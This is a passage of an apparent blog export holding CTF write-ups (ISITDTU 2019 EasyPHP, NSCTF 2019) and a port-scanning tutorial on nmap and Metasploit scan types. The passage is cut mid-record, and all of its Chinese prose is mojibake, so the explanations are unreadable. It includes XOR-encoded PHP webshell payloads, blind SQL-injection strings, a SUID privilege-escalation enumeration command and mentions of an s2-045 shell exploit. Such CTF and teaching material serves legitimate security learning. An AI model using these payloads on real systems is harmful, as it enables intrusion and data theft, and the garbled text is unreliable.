Way-Step 3 é€šè¿‡æ€»ç»“æˆ‘ä»¬æ‰€éœ€è¦çš„å­—æ¯ï¼š._acdinprstï¼Œç„¶åè¿›è¡Œç±»ä¼¼çš„æ„é€ ï¼š\nt = s^c^d n = i^c^d r = a^c^p print_r -\u0026gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8f%9e%96%96%8c%a0%9e)^(%ff%9c%ff%9c%9c%ff%9c)^(%ff%8f%ff%9b%9b%ff%8f)) scandir -\u0026gt; ((%ff%ff%ff%ff%ff%ff%ff)^(%8c%9c%9e%96%9b%96%9e)^(%ff%ff%ff%9c%ff%ff%9c)^(%ff%ff%ff%9b%ff%ff%8f)) å³å¯è¿›è¡Œå‡½æ•°æ“ä½œäº†\nAnother Way 2 çœ‹è¿™é¢˜çš„æ—¶å€™æƒ³èµ·äº†pç‰›çš„å‡ ç¯‡æ–‡ç« ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š\nä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell\næ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡\nè¿™ä¸¤ç¯‡ä¹Ÿç»™äº†æˆ‘å½“æ—¶å¾ˆå¤§çš„å¯å‘ä»¥åŠæ€è·¯ã€‚å°¤å…¶æ˜¯ç¬¬äºŒç¯‡ä¸­çš„ payload ï¼Œå…¶å®å¯ä»¥ç›´æ¥æ‹¿æ¥ç”¨\n \nå¤§å®¶å¯ä»¥è¯¦ç»†çš„å‚è€ƒè¿™ä¸¤ç¯‡æ–‡ç« ï¼Œpç‰›ç¬¬ä¸€ç¯‡æ˜¯é€šè¿‡ä½è¿ç®—ä»¥åŠè‡ªå¢æ¥è¿›è¡Œæ“ä½œï¼Œç¬¬äºŒç¯‡åœ¨ php7 ç¯å¢ƒä¸‹åˆ™æ˜¯é€šè¿‡å–åæ¥è¿›è¡Œæ“ä½œï¼Œè¿™é‡Œå‰é¢å°±ç®€å•ä»‹ç»äº†ä¸€ä¸‹é€šè¿‡å¼‚æˆ–çš„æ“ä½œå½¢å¼ã€‚\nBonus é¢˜å¤–è¯ï¼Œçœ‹åˆ° @Mr.Liu å¸ˆå‚…å†™çš„ä¸€ä¸ªéšæœºå¼‚æˆ–å…æ€çš„é©¬ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ä¸€ä¸ªé¡¹ç›®:Githubåœ°å€\nReference [EasyPHP (871 points)](https://github.com/Samik081/ctf-writeups/blob/master/ISITDTU CTF 2019 Quals/web/easyphp.md)\nISITDTU CTF 2019 - EasyPHP\nä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell\næ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡\n","date":"2019-07-20T01:22:26Z","permalink":"https://blog.zeddyu.info/2019/07/20/isitdtu-2019/","title":"ISITDTU CTF 2019 EasyPHP å›é¡¾"},{"content":"è¿™æ˜¯ä¸€ä¸ªç»¿ç›Ÿå¼„çš„ CTF ï¼Œå› ä¸ºåœ¨å¤ä¹ è€ƒè¯•æ‰€ä»¥æ²¡æ€ä¹ˆç©â€¦éšä¾¿ç©äº†ä¸€ä¸‹é¡ºæ‰‹å†™ä¸ª wp\nWeb Web1 åœ°å€åœ¨http://39.106.184.130:8084/\næ‰«ç›®å½•å¾—åˆ°.DS_Storeæ–‡ä»¶ï¼Œä½¿ç”¨ lijiejie çš„ dstore_exp å·¥å…·æ¢å¤æ–‡ä»¶ï¼Œåˆå¾—åˆ°ä¸€ä¸ªCTF_Can_U_Tell_Me_The_Flagçš„æ–‡ä»¶å¤¹ï¼Œå‘ç°æœ‰.git ï¼Œç›´æ¥ç”¨ GitHack å¼„ä¸‹æ¥ï¼Œåœ¨git logä¸­å‘ç° flag\n \nWeb2 Web2åœ°å€ç»™äº†ä¸¤ä¸ªï¼Œä¸¤ä¸ªåœ°å€éƒ½ä¸ä¸€æ ·â€¦è’™è”½\u0026hellip;\n \nç¬¬äºŒä¸ªåœ°å€ç»™äº†ä¸ª GitLab çš„åœ°å€ï¼Œæˆ‘ä»¥ä¸ºå®˜æ–¹å¼„é”™äº†å•¥çš„ï¼Œä¸€ç›´æ€¼ç¬¬ä¸€ä¸ªåœ°å€ï¼Œå„ç§çŒœï¼ŒSSRFã€æ³¨å…¥å•¥çš„éƒ½çŒœäº†ç»“æœéƒ½æ²¡ç”¨ã€‚\nç»“æœåœ¨èµ›åæœ‰å¸ˆå‚…è¯´ Gitlab æœ‰è¶Šæƒ\u0026hellip;ç„¶åè‡ªå·±æ‰«äº†ä¸€ä¸‹å½“çœŸæ‰«åˆ°äº†/rootçš„åœ°å€ï¼Œå¯ä»¥è¶Šæƒè®¿é—® Administrator çš„é¡µé¢\næˆ–è€…è¯´å¯ä»¥çœ‹åˆ° Administrator çš„æäº¤è®°å½•\n \nå¯ä»¥çœ‹åˆ°ä¸‹é¢æœ‰ä¸ª commit æè¿°ï¼šå¢åŠ è¯»å– flag ä»£ç â€¦ç„¶åå¾—åˆ°æºç \u0026hellip;\n \nåé¢å°±æ²¡ä»€ä¹ˆå¥½è¯´çš„äº†\u0026hellip;æºç å¦‚ä¸‹ï¼š\n\u0026lt;?php session_start(); function get_contents($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_MAXREDIRS, 0); curl_setopt($curl, CURLOPT_TIMEOUT, 3); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 3); curl_setopt($curl, CURLOPT_RESOLVE, array($host . \u0026#34;:\u0026#34; . $port . \u0026#34;:\u0026#34; . $ip)); curl_setopt($curl, CURLOPT_PORT, $port); $data = curl_exec($curl); if (curl_error($curl)) { error(curl_error($curl)); } $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); if ($status \u0026gt;= 301 and $status \u0026lt;= 308) { $url = curl_getinfo($curl, CURLINFO_REDIRECT_URL); } else { return $data; } } function error($s) { clear_directory(); die(\u0026#34;\u0026lt;h2\u0026gt;\u0026lt;b\u0026gt;ERROR\u0026lt;/b\u0026gt;\u0026lt;/h2\u0026gt; \u0026#34; . htmlspecialchars($s)); } $msg = \u0026#34;\u0026#34;; if (isset($_GET[\u0026#34;url\u0026#34;])\u0026amp;\u0026amp;\u0026#34;0769cdd4c5a9d8142a08373826c87baa\u0026#34;==md5($_GET[\u0026#34;pass\u0026#34;])) { $msg = get_contents($_GET[\u0026#34;url\u0026#34;]); } ?\u0026gt;\u0026lt;html\u0026gt; \u0026lt;head\u0026gt;\u0026lt;title\u0026gt;æ‰¾flag!\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form\u0026gt; \u0026lt;h1\u0026gt;çŒœä¸€çŒœflagsåœ¨å“ªé‡Œï¼\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;\u0026lt;b\u0026gt;è¯·è¾“å…¥URLï¼š\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;text\u0026#34; size=\u0026#34;100\u0026#34; name=\u0026#34;url\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;æäº¤\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;?php if (!empty($msg)) echo \u0026#34;\u0026lt;hr\u0026gt;\u0026lt;p\u0026gt;\u0026#34; . $msg . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; ?\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  \nWeb3 å‘ç°ç”± JSESSIONID=54361A6D54D3993C78020F67804A0248ï¼Œç›´æ¥ä¸Š struts-scan ï¼Œå¯ä»¥æ‰«åˆ°s2-045ï¼Œç›´æ¥ä¸Šexp å¯ä»¥æ‹¿åˆ° shell\nä½†æ˜¯å¯ä»¥å‘ç° flag.txt åªæœ‰ 600 çš„æƒé™ï¼ŒæŸ¥çœ‹å†…æ ¸ï¼Œå°è¯•ç”¨CVE-2018-18182è¿›è¡Œææƒï¼Œåæ¥è²Œä¼¼è¢«ä¸»åŠæ–¹ä¿®äº†ï¼Œæ²¡ææˆåŠŸã€‚\n \nå°è¯•ä½¿ç”¨ SUID è¿›è¡Œææƒï¼Œå¯ä»¥å‚è€ƒã€å®‰å…¨ç§‘æ™®ã€‘Linuxææƒâ€”â€”åˆ©ç”¨å¯æ‰§è¡Œæ–‡ä»¶SUID\nä½¿ç”¨find / -user root -perm -4000 -print 2\u0026gt;/dev/nullæŸ¥çœ‹å¯ä»¥æ‹¥æœ‰ SUID æƒé™çš„æ‰§è¡Œæ–‡ä»¶ï¼š\n \nå‘ç°æœ‰tacå‘½ä»¤ï¼Œç„¶åç›´æ¥ç”¨tacå°±å¯ä»¥æ‹¿åˆ° flag äº†\n \nè¿™é‡Œæ¯”èµ›çš„æ—¶å€™ç›´æ¥ç”¨tacå¯ä»¥æ‹¿åˆ°äº†ï¼Œç°åœ¨åˆä¸å¯ä»¥äº†\u0026hellip;ä¸çŸ¥é“æ˜¯ä¸æ˜¯è¿™ä¸ª exp çš„åŸå› â€¦æ²¡æœ‰æ·±å…¥\u0026hellip;\nç„¶åä¹Ÿæ‹¿åˆ°äº†é¢˜ç›®æºç ï¼Œçœ‹äº†ä¸€ä¸‹è²Œä¼¼æ˜¯ä¸ªä¸Šä¼ çš„ç‚¹ï¼Œä¸è¿‡å¯ä»¥ç›´æ¥ç”¨ s2-045 è¿›æ¥å¯èƒ½ä¹Ÿæ˜¯ä¸€ç§é¢„æœŸè§£æ³•ï¼Ÿ\nWeb4 æ²¡æå‡ºæ¥â€¦ç»™äº†ä¸ª password.txt ï¼Œä¹Ÿæ˜¯ç»™äº†ä¸¤ä¸ª web åœ°å€ï¼Œæ¯”è¾ƒè¿·ã€‚\nç„¶è€Œç”¨è¿™ä¸ªæ–‡æœ¬é‡Œé¢çš„ç™»å½•ç¬¬ä¸€ä¸ª web admin è´¦æˆ·ï¼Œæ²¡æœ‰æˆåŠŸ\u0026hellip;\nçœ‹ç¬¬äºŒä¸ª web åœ°å€å›æ˜¾äº†ä¸€ä¸ª mysql çš„é”™è¯¯ã€‚\n \nä¸ç¡®å®šæ˜¯ä¸æ˜¯è¢«æ…å±äº†â€¦ä¸¤ä¸ª web åœ°å€çš„è„‘æ´çœŸæä¸åŠ¨\u0026hellip;\nï¼ˆç›²çŒœç¬¬ä¸€ä¸ªè¿›å…¥ç®¡ç†å‘˜åç”¨ Rogue mysql æ¥æ‹¿ flag\nWeb5  \nä¸­é—´æœ‰ä¸ªæŒ‰é’®ç”¨æ¥éšæœº id ï¼Œä¸€çœ‹å°±æ˜¯ä¸ªæ³¨å…¥é¢˜ã€‚banäº†æ¯”è¾ƒå¤šçš„å…³é”®å­—ï¼Œå¤§å°å†™ä¹Ÿç»•ä¸è¿‡ï¼Œè€Œä¸”è¿˜ ban äº†information_schemaå…³é”®å­—ã€‚é‚£å°±è¯´æ˜ä¸èƒ½ç”¨ä¸€èˆ¬çš„æ³¨å…¥æ–¹æ³•æ¥å¼„ã€‚\nå°è¯• bool ç›²æ³¨ï¼Œå¯ä»¥åˆ©ç”¨\n(casewhen(hex(substr(database(),1,1))in(33))then1else0end) \nå¾—åˆ°æ•°æ®åº“åä¸º deb7cb73f0ea2b2af2d1e3715fd12044 ã€‚æ¥ä¸‹æ¥æ€ä¹ˆå¼„è¡¨åå‘¢ï¼Ÿå°è¯•äº†å¥½ä¸€ä¼šï¼Œç»•ä¸è¿‡é™åˆ¶ï¼Œç„¶åé¢˜ç›®åˆæç¤º flag é•¿åº¦ä¸º32\u0026hellip;\nç„¶åç›²çŒœ flag è¡¨ååº“åä¸º flag ï¼Œå­—æ®µåä¹Ÿæ˜¯ flagï¼Œæ‰€ä»¥æœ‰\n(casewhen(hex(substr(length(selectflagfromdeb7cb73f0ea2b2af2d1e3715fd12044.flag)),1,1))in(33))then1else0end)å‘ç°èƒ½å¾—åˆ°æ­£ç¡®çš„ç»“æœ\u0026hellip;\nåé¢å°±åƒç›´æ¥ç›´æ¥çˆ†å°±å¥½äº†\u0026hellip;æ›´æ‰¯æ·¡çš„æ˜¯â€¦ flag è·Ÿæ•°æ®åº“åä¸€æ ·\u0026hellip;\nWeb6 æ¯«æ— æŠ€æœ¯å«é‡çš„é¢˜ç›®ï¼Œä¼ªé€  xff å°±è¡Œäº†ã€‚\nConclusion éšä¾¿ç©ç©çš„æ¯”èµ›\u0026hellip;è´¨é‡ä¸æ˜¯å¾ˆå¥½â€¦\n","date":"2019-07-07T00:44:10Z","permalink":"https://blog.zeddyu.info/2019/07/07/nsctf-2019/","title":"NSCTF 2019 WP"},{"content":"æœ€è¿‘è¦å†™ä¸ªç«¯å£æ‰«æå™¨ï¼Œå­¦ä¹ æ•´ç†äº†ä¸€ä¸‹ç›®å‰çš„ç«¯å£æ‰«æå™¨æŠ€æœ¯ã€‚\næŒ‰ç…§ç›®å‰çš„åè®®ç±»å‹ï¼Œæˆ‘ä»¬å¤§è‡´å¯ä»¥çŸ¥é“æœ‰ï¼š\n â€‹\tä¸€ä¸ªIPåœ°å€å¯ä»¥æœ‰65535(2^16)ä¸ªç«¯å£ï¼ŒèŒƒå›´åˆ™æ˜¯ä»0åˆ°65535(2^16-1)ï¼Œæ¯ä¸ªç«¯å£æŒ‰ç…§åè®®åˆå¯ä»¥åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šä¸€ç§æ˜¯TCPç«¯å£ï¼›å¦ä¸€ç§æ˜¯UDPç«¯å£ã€‚\nâ€‹\tTCPã€UDPéƒ½æ˜¯IPå±‚çš„ä¼ è¾“åè®®ï¼Œå…¶ä¸­TCPæ˜¯é¢å‘è¿æ¥ã€å¯é çš„å­—èŠ‚æµæœåŠ¡ï¼›UDPåˆ™æ˜¯ä¸å¯é çš„ï¼Œé¢å‘æ•°æ®æŠ¥çš„æœåŠ¡ã€‚æ¯ä¸€ä¸ªç«¯å£éƒ½ä¼šæ”¯æŒè¿™ä¸¤ç§åè®®ï¼Œå› æ­¤å¯ä»¥åŸºäºè¿™ä¸¤ç§åè®®è¿›è¡Œç«¯å£æ‰«æã€‚\n ä»¥åŠç°åœ¨è¿˜æœ‰é€šè¿‡åœ¨ TCP/IP æ¨¡å‹ä¸­çš„ç½‘ç»œå±‚ ICMP åè®®æ¥æ¢æµ‹ç«¯å£çš„æ‰«ææŠ€æœ¯ã€‚\nTCP TCPæŠ¥æ–‡è¿™é‡Œå°±ä¸å†ç»†è®²äº†ï¼Œä¹Ÿä¸æ˜¯é‡ç‚¹ï¼Œæ”¾ä¸€å¼ TCPæ•°æ®æŠ¥æ–‡çš„å›¾ï¼Œå…·ä½“å¯ä»¥å»ç™¾åº¦ç™¾ç§‘äº†è§£ï¼š\n \nTCPä¸‰æ¬¡æ¡æ‰‹ï¼š\n \nTCP CONNECT SCAN åŸç†å¾ˆç®€å•ï¼Œä¸ç›®æ ‡ç«¯å£å»ºç«‹3æ¬¡æ¡æ‰‹ï¼Œå¦‚æœæˆåŠŸå»ºç«‹åˆ™ä¸ºopenï¼Œæ”¶åˆ°RSTåˆ™ä¸ºclose\n TCP CONNECT SCAN \nusage MSF æ¨¡å—ï¼š\nuse auxiliary/scanner/portscan/tcp  \nNmap é€‰é¡¹å‚æ•°ï¼š\nnmap -sT scanme.nmap.org TCP SYN SCAN ä¹Ÿç§°ä¸ºTCPåŠè¿æ¥æ‰«æï¼Œåªå‘é€ä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸€æ¬¡SYNæŠ¥æ–‡æ®µï¼Œå¦‚æœæ”¶åˆ°ACK+SYNåˆ™ä¸ºopenï¼Œæ”¶åˆ°RSTåˆ™ä¸ºcloseï¼Œè¿™ç§å¥½å¤„æ˜¯ä¸å¿…ç­‰å¾…ä¸‰æ¬¡æ¡æ‰‹å®Œå…¨å®Œæˆï¼Œé€Ÿåº¦å¿«ä¸”ä¸å®¹æ˜“è¢«é˜²ç«å¢™è®°å½•è¿›æ—¥å¿—ã€‚\n TCP SYN SCAN \nNmap å¤„ç†æ–¹å¼ï¼š\n   Probe Response Assigned State     TCP SYN/ACK response open   TCP RST response closed   No response received (even after retransmissions) filtered   ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered    usage MSF æ¨¡å—ï¼š\nuse auxiliary/scanner/portscan/syn  \nNmap å‚æ•°\nnmap -sS scanme.nmap.org TCP Xmas Tree SCAN å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€å¸¦æœ‰ PSHï¼ŒFINï¼ŒURG æ ‡è¯†çš„æ•°æ®åŒ…(å³ä¸å«æœ‰ACK SYN RST)ï¼Œè¢«ç§°ä¸ºTCP Xmas Treeæ‰«æã€‚å…¶åˆ©ç”¨çš„æ˜¯RFCçš„è§„å®š:\n â€‹\tå¦‚æœä¸è®¾ç½®SYNï¼ŒRSTï¼Œæˆ–è€…ACKä½çš„æŠ¥æ–‡å‘é€åˆ°å¼€æ”¾ç«¯å£ï¼Œç†è®ºä¸Šï¼Œè¿™ä¸åº”è¯¥å‘ç”Ÿï¼Œå¦‚æœæ‚¨ç¡®å®æ”¶åˆ°äº†ï¼Œä¸¢å¼ƒè¯¥æŠ¥æ–‡ï¼Œè¿”å›ã€‚\n é‚£ä¹ˆå°±æœ‰ï¼š\n â€‹\tå¦‚æœæ‰«æç³»ç»Ÿéµå¾ªè¯¥RFCï¼Œå½“ç«¯å£å…³é—­æ—¶ï¼Œä»»ä½•ä¸åŒ…å«SYNï¼ŒRSTï¼Œæˆ–è€…ACKä½çš„æŠ¥æ–‡ä¼šå¯¼è‡´ ä¸€ä¸ªRSTè¿”å›è€Œå½“ç«¯å£å¼€æ”¾æ—¶ï¼Œåº”è¯¥æ²¡æœ‰ä»»ä½•å“åº”ã€‚åªè¦ä¸åŒ…å«SYNï¼ŒRSTï¼Œæˆ–è€…ACK, ä»»ä½•å…¶å®ƒä¸‰ç§(FINï¼ŒPSHï¼Œand URG)çš„ç»„åˆéƒ½è¡Œã€‚\n  TCP XMAS TREE SCAN \nNmap å¯¹ NULL, FIN, or Xmas æ‰«æçš„å¤„ç†ï¼š\n   Probe Response Assigned State     No response received (even after retransmissions) open or filtered   TCP RST packet closed   ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered    usage MSF æ¨¡å—ï¼š\nuse auxiliary/scanner/portscan/xmas  \nNmap é€‰é¡¹å‚æ•°ï¼š\nNull scan (`-sN`) Does not set any bits (TCP flag header is 0) FIN scan (`-sF`) Sets just the TCP FIN bit. Xmas scan (`-sX`) Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. TCP NULL SCAN ç©ºæ‰«æå³flagä½å…¨ 0 ï¼Œå¦‚æœæ²¡æœ‰å›å¤åˆ™ä¸ºopenï¼Œæ”¶åˆ°RSTåˆ™ä¸ºclose\n TCP NULL SCAN \nTCP ACK SCAN ä½¿ç”¨TCP ACKæ‰«æä¸èƒ½å¤Ÿç¡®å®šç«¯å£çš„å…³é—­æˆ–è€…å¼€æ”¾ï¼Œå› ä¸ºå½“å‘é€ç»™å¯¹æ–¹ä¸€ä¸ªå«æœ‰ ACK è¡¨ç¤ºçš„TCPæŠ¥æ–‡çš„æ—¶å€™ï¼Œéƒ½è¿”å›å«æœ‰RSTæ ‡å¿—çš„æŠ¥æ–‡ï¼Œæ— è®ºç«¯å£æ˜¯å¼€æ”¾æˆ–è€…å…³é—­ã€‚æ‰€ä»¥ï¼Œä¸èƒ½ä½¿ç”¨TCP ACKæ‰«ææ¥ç¡®å®šç«¯å£æ˜¯å¦å¼€æ”¾æˆ–è€…å…³é—­ã€‚ä½†æ˜¯å¯ä»¥åˆ©ç”¨å®ƒæ¥æ‰«æé˜²ç«å¢™çš„é…ç½®ï¼Œç”¨å®ƒæ¥å‘ç°é˜²ç«å¢™è§„åˆ™ï¼Œç¡®å®šå®ƒä»¬æ˜¯æœ‰çŠ¶æ€çš„è¿˜æ˜¯æ— çŠ¶æ€çš„ï¼Œå“ªäº›ç«¯å£æ˜¯è¢«è¿‡æ»¤çš„ã€‚\nå‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªå¸¦æœ‰ ACK æ ‡è¯†çš„æ•°æ®åŒ…ï¼Œå¦‚æœæ”¶åˆ°å¸¦æœ‰ RST æ ‡è¯†çš„å“åº”ï¼Œåˆ™è¯´æ˜æœåŠ¡ç«¯æ²¡æœ‰è¿‡æ»¤ï¼Œä¸å­˜åœ¨çŠ¶æ€é˜²ç«å¢™ã€‚\n TCP ACK SCAN \nusage å¯ä»¥ä½¿ç”¨ msf çš„æ¨¡å—\nuse auxiliary/scanner/portscan/ack  \nNmap å¯ä»¥ç”¨ä»¥ä¸‹å‘½ä»¤\nnmap -sA scanme.nmap.org TCP WINDOW SCAN TCP çª—å£æ‰«æçš„æµç¨‹ç±»ä¼¼äº ACK æ‰«æï¼Œéƒ½æ˜¯å‘æœåŠ¡ç«¯å‘é€å¸¦æœ‰ ACK æ ‡è¯†çš„æ•°æ®åŒ…ï¼Œä¸åŒçš„åœ¨äº TCP çª—å£æ‰«æä¼šæ£€æŸ¥æ”¶åˆ°çš„ RST æ•°æ®åŒ…ä¸­çš„çª—å£å¤§å°ï¼Œå¦‚æœ RST æ•°æ®åŒ…ä¸­çš„çª—å£å¤§å°ä¸ä¸ºé›¶ï¼Œåˆ™è¯´æ˜ç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚\n TCP WINDOW SCAN \nå¦‚æœ RST æ•°æ®åŒ…ä¸­çš„çª—å£å¤§å°ä¸ºé›¶ï¼Œåˆ™è¯´æ˜ç›®æ ‡ç«¯å£å¤„äºå…³é—­çŠ¶æ€ã€‚\n TCP WINDOW SCAN \nNmap å¯¹ TCP Window æ‰«æçš„å¤„ç†ï¼š\n   Probe Response Assigned State     TCP RST response with non-zero window field open   TCP RST response with zero window field closed   No response received (even after retransmissions) filtered   ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered    usage Nmap æ‰«æå‚æ•°ï¼š\nnmap -sW docsrv.caldera.com TCP Idle Scan 1998å¹´ï¼Œå®‰å…¨ç ”ç©¶å‘˜Antirezï¼ˆæ›¾å‚ä¸ç¼–è¾‘nmapä¸­æœ‰å…³hping2å·¥å…·çš„ç›¸å…³æ–‡ç« ï¼‰åœ¨Bugtraqé‚®ä»¶åˆ—è¡¨ä¸­å‘å¸ƒäº†ä¸€ç¯‡å…³äºæ–°çš„ç«¯å£æ‰«ææŠ€æœ¯çš„æ–‡ç« ã€‚Idle Scanï¼Œä¹Ÿå°±æ…¢æ…¢çš„ä¸ºä¼—äººæ‰€äº†è§£ï¼Œå®ƒå…è®¸è¿›è¡Œå®Œå…¨ç›²ç›®çš„ç«¯å£æ‰«æã€‚äº‹å®ä¸Šï¼Œæ”»å‡»è€…å¯ä»¥ä¸ç”¨å‘ç›®æ ‡å‘é€æ•°æ®åŒ…å°±å®Œæˆæ‰«æå·¥ä½œï¼ç›¸åï¼Œç”¨çŒ¥ççš„è¾¹ä¿¡é“æ”»å‡»æ˜¯èƒ½å¤Ÿè®©æ‰«ææ˜ å°„åˆ°ä¸€ä¸ªZombie ä¸»æœºä¸Šçš„ã€‚é™¤äº†æå…¶éšè”½çš„æƒ…å†µï¼Œè¿™ç§æ‰«ææ–¹å¼å…è®¸æŒ–æ˜æœºå™¨ä¹‹é—´åŸºäºIPçš„ä¿¡ä»»å…³ç³»ã€‚\nè™½ç„¶ Idle Scan æ¯”ç›®å‰è®¨è®ºçš„ä»»ä½•æŠ€æœ¯éƒ½å¤æ‚ï¼Œä½†æ‚¨æ— éœ€æˆä¸ºTCP / IPä¸“å®¶å°±èƒ½ç†è§£å®ƒã€‚ä½ åªéœ€è¦çŸ¥é“è¿™äº›å°±å¤Ÿäº†ï¼š\n  ç¡®å®šTCPç«¯å£æ˜¯å¦æ‰“å¼€çš„ä¸€ç§æ–¹æ³•æ˜¯å‘ç«¯å£å‘é€SYNï¼ˆä¼šè¯å»ºç«‹ï¼‰æ•°æ®åŒ…ã€‚å¦‚æœç«¯å£æ‰“å¼€ï¼Œç›®æ ‡æœºå™¨å°†å“åº”SYN / ACKï¼ˆä¼šè¯è¯·æ±‚ç¡®è®¤ï¼‰æ•°æ®åŒ…ï¼Œå¦‚æœç«¯å£å…³é—­ï¼Œåˆ™å“åº”RSTï¼ˆé‡ç½®ï¼‰ã€‚è¿™æ˜¯å‰é¢è®¨è®ºçš„SYNæ‰«æçš„åŸºç¡€ã€‚\n  æ¥æ”¶æœªç»è¯·æ±‚çš„SYN / ACKæ•°æ®åŒ…çš„è®¡ç®—æœºå°†ä½¿ç”¨RSTè¿›è¡Œå“åº”ã€‚æœªç»è¯·æ±‚çš„RSTå°†è¢«å¿½ç•¥ã€‚\n  Internetä¸Šçš„æ¯ä¸ªIPæ•°æ®åŒ…éƒ½æœ‰ä¸€ä¸ªç‰‡æ®µæ ‡è¯†å·ï¼ˆIP IDï¼‰ã€‚ç”±äºè®¸å¤šæ“ä½œç³»ç»Ÿåªæ˜¯ä¸ºå®ƒä»¬å‘é€çš„æ¯ä¸ªæ•°æ®åŒ…é€’å¢æ­¤æ•°å­—ï¼Œå› æ­¤æ¢æµ‹IPIDå¯ä»¥å‘Šè¯‰æ”»å‡»è€…è‡ªä¸Šæ¬¡æ¢æµ‹ä»¥æ¥å·²å‘é€äº†å¤šå°‘æ•°æ®åŒ…ã€‚\n  ç»“åˆä»¥ä¸Šç‰¹å¾ï¼Œå°±å¯ä»¥ä¼ªé€ èº«ä»½å»æ‰«æç›®æ ‡ç½‘ç»œï¼Œæ‰€ä»¥çœ‹èµ·æ¥å°±åƒæ˜¯æ— è¾œçš„ Zombie ä¸»æœºåœ¨æ‰«æã€‚\nIdle Scan Step by Step ä»æœ¬è´¨ä¸Šæ¥çœ‹ï¼ŒIdle Scan åªéœ€è¦é‡å¤3ä¸ªæ­¥éª¤å°±okäº†ã€‚\n æ¢æŸ¥Zombieçš„IP IDå¹¶è®°å½•ä¸‹æ¥ã€‚ åœ¨Zombieä¸»æœºä¸Šä¼ªé€ ä¸€ä¸ªåŒ…ï¼Œç„¶åæŠŠåŒ…å‘é€ç»™ç›®æ ‡ä¸»æœºç«¯å£ã€‚æ ¹æ®ç«¯å£çš„çŠ¶æ€ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šä¹Ÿæœ‰å¯èƒ½ä¸ä¼šå¯¼è‡´Zombieä¸»æœºIPIDå€¼å¢åŠ ã€‚ å†æ¢æŸ¥Zombieä¸»æœºçš„IP IDã€‚æ¯”è¾ƒä¸¤æ¬¡å¾—åˆ°IPIDå€¼  ç»è¿‡è¿™æ ·ä¸€ä¸ªæµç¨‹ï¼ŒZombieä¸»æœºçš„ IP ID åº”è¯¥ä¼šå¢åŠ 1~2ã€‚å¦‚æœåªæ˜¯å¢åŠ äº†1ï¼Œé‚£ä¹ˆå°±å¯ä»¥è¯´æ˜Zombieä¸»æœºè¿˜æ²¡æœ‰å‘å‡ºä»»ä½•åŒ…ï¼Œå½“ç„¶ï¼Œå“åº”æ”»å‡»è€…çš„æ¢æŸ¥è¯·æ±‚é™¤å¤–ã€‚æ²¡æœ‰å‘é€åŒ…ä¹Ÿå°±æ„å‘³ç€ç›®æ ‡ç«¯å£æ²¡æœ‰è¢«æ‰“å¼€ï¼ˆä¹Ÿå¯èƒ½æ˜¯ç›®æ ‡ä¸»æœºå‘Zombieä¸»æœºå‘é€äº†ä¸€ä¸ªRSTåŒ…ï¼Œå¯¼è‡´è¯·æ±‚è¢«å¿½ç•¥ï¼Œæˆ–è€…æ˜¯æ ¹æœ¬å°±æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰åšï¼‰ã€‚å¢åŠ çš„å¦‚æœæ˜¯2ï¼Œé‚£å°±è¡¨æ˜Zombieä¸»æœºæˆåŠŸåœ¨ä¸¤ä¸ªæ¢æµ‹å™¨ä¹‹é—´å‘é€äº†åŒ…ã€‚è¿™ç§æƒ…å†µä¸€èˆ¬æƒ…å†µéƒ½æ„å‘³ç€ç›®æ ‡ç«¯å£æ˜¯å¼€ç€çš„ï¼ˆç›®æ ‡å¤§æ¦‚ä¼šå‘Zombieä¸»æœºå‘é€ä¸€ä¸ªSYN/ACKåŒ…å»å“åº”æ”»å‡»è€…ä¼ªé€ çš„SYNï¼Œä»Zombieä¸»æœºè¯±å¯¼RSTåŒ…ï¼‰ã€‚å¦‚æœæ˜¯å¢åŠ äº†ä¸€ä¸ªæ¯”2è¿˜å¤§çš„æ•°å­—ï¼Œé‚£ä¹ˆå°±è¯´æ˜Zombieä¸»æœºå¤ªç³Ÿç³•äº†ï¼å®ƒå¯èƒ½ä¸èƒ½èƒœä»»é¢„æµ‹IPIDæ•°å€¼ï¼Œä¹Ÿå¯èƒ½æ˜¯æ­£åœ¨å¿™äºå…¶ä»–ä¸Idle Scanæ— å…³çš„äº‹æƒ…ã€‚\nè™½ç„¶å…³é—­äº†ç«¯å£å’Œè¢«è¿‡æ»¤çš„ç«¯å£ä¼šå‘ç”Ÿçš„äº‹æƒ…ç¨å¾®æœ‰ç‚¹ç‚¹ä¸åŒï¼Œä½†æ˜¯æ”»å‡»è€…å¤„ç†çš„æ–¹æ³•éƒ½ä¸€æ ·ï¼ŒIPIDéƒ½åªæ˜¯å¢åŠ 1ã€‚æ‰€ä»¥ï¼Œåœ¨Idel Scanä¸­æ— 